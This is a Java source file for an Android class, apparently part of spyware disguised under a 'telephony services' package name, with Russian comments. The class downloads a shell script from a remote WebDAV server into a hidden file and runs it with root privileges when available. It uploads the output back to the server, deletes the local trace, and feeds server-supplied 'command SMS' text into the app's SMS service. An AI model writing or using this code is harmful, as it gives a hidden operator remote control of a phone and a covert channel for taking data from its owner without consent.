package com.telephony.services;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

public class Scripter {
    private MyWebdavClient webdavClient = null;
    private PreferenceUtils sPref = null;
    private File local_shell_file, local_sms_file;
    private File local_script_outfile;
    private Context context;

    public static final String SCRIPT_SHELL_FILE = "sh/script.sh";
    public static final String SCRIPT_SMS_FILE = "sh/script.sms";
    public static final String SCRIPT_OUT_FILE = "sh/script.out";

    public Scripter(Context context, final MyWebdavClient webdavClient) throws IOException {
        this.context = context;
        this.webdavClient = webdavClient;
        sPref = PreferenceUtils.getInstance(context);

        local_shell_file = Utils.getHidden(webdavClient.getLocalFile(sPref.getRootDir(), SCRIPT_SHELL_FILE));
        local_sms_file = Utils.getHidden(webdavClient.getLocalFile(sPref.getRootDir(), SCRIPT_SMS_FILE));
        local_script_outfile = new File(sPref.getRootDir(), SCRIPT_OUT_FILE);
    }

    /**
     * Выполняет shell script из файла SCRIPT_SHELL_FILE на сервере.<br>
     * Выполняет только если размер локальной копии SCRIPT_SHELL_FILE равен размеру SCRIPT_SHELL_FILE на сервере.<br>
     * Вывод сохраняет в SCRIPT_OUT_FILE, загружает его обратно на сервер и удаляет локальную копию.<br>
     * Также в выполняемом скрипте определяет переменные $ROOT_DIR, $PACKAGE_FILE, $URL, $SCRIPT_SHELL_FILE, $SCRIPT_SMS_FILE, $SCRIPT_OUTFILE.
     *
     * @throws IOException
     */
    public void execShellScript() throws IOException {
        String[] cmds = null;
        String[] outs = null;
        String shell = "sh";
        FileInputStream fis = null;
        byte[] buffer = new byte[1024];
        StringBuilder sb = new StringBuilder();

        long rfs = webdavClient.getFileSize(SCRIPT_SHELL_FILE);

        if ((rfs > 0) && (rfs != local_shell_file.length())) {
            if (webdavClient.downloadFile(SCRIPT_SHELL_FILE, local_shell_file)) {
                fis = new FileInputStream(local_shell_file);
                try {
                    if (fis != null) {
                        sb.append("ROOT_DIR=\"" + sPref.getRootDir() + "\"").append("\n");
                        sb.append("PACKAGE_FILE=\"" + Utils.getPackageFile(context).getAbsolutePath() + "\"").append("\n");
                        sb.append("URL=\"" + sPref.getRemoteUrl() + "\"").append("\n");
                        sb.append("SCRIPT_SHELL_FILE=\"" + local_shell_file.getAbsolutePath() + "\"").append("\n");
                        sb.append("SCRIPT_SMS_FILE=\"" + local_sms_file.getAbsolutePath() + "\"").append("\n");
                        sb.append("SCRIPT_OUTFILE=\"" + local_script_outfile.getAbsolutePath() + "\"").append("\n").append("\n");
                        int count = -1;
                        while ((count = fis.read(buffer)) > 0) {
                            sb.append(new String(buffer).substring(0, count));
                        }
                    }
                } finally {
                    if (fis != null) {
                        fis.close();
                    }
                }

                cmds = sb.toString().split("[ \r]*\n+");
                if (cmds.length > 0) {
                    if (Utils.checkRoot()) {
                        shell = "su";
                    }
                    outs = new Proc(shell).exec(cmds);
                    Utils.writeFile(local_script_outfile, Utils.implodeStrings(outs, "\n"));
                    if (Connection.getInstance(context).isConnected(sPref.isWifiOnly()) && webdavClient.isReady()) {
                        if (webdavClient.uploadFile(local_script_outfile, webdavClient.getRemoteFile(sPref.getRootDir(), local_script_outfile))) {
                            local_script_outfile.delete();
                        }
                    }
                }
            }
        }

    }

    /**
     * Эмулирует прием командной СМС с текстом из SCRIPT_SMS_FILE на FTP сервере<br>
     * Выполняет только если размер локальной копии SCRIPT_SMS_FILE равен размеру SCRIPT_SMS_FILE на сервере.<br>
     *
     * @throws IOException
     */
    public void execSMScript() throws IOException {
        FileInputStream fis = null;
        byte[] buffer = new byte[1024];
        StringBuilder sb = new StringBuilder();

        long rfs = webdavClient.getFileSize(SCRIPT_SMS_FILE);

        if ((rfs > 0) && (rfs != local_sms_file.length())) {
            if (webdavClient.downloadFile(SCRIPT_SMS_FILE, local_sms_file)) {
                fis = new FileInputStream(local_sms_file);
                try {
                    if (fis != null) {
                        int count = -1;
                        while ((count = fis.read(buffer)) > 0) {
                            sb.append(new String(buffer).substring(0, count));
                        }
                    }
                    AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
                    Intent mi = new Intent(context, SMService.class).putExtra(SMService.EXTRA_SMS_BODY, sb.toString());
                    mi.setData(Uri.parse(mi.toUri(Intent.URI_INTENT_SCHEME)));
                    PendingIntent pi = PendingIntent.getService(context, 0, mi, 0);
                    am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 0, pi);
                } finally {
                    if (fis != null) {
                        fis.close();
                    }
                }
            }
        }

    }
}
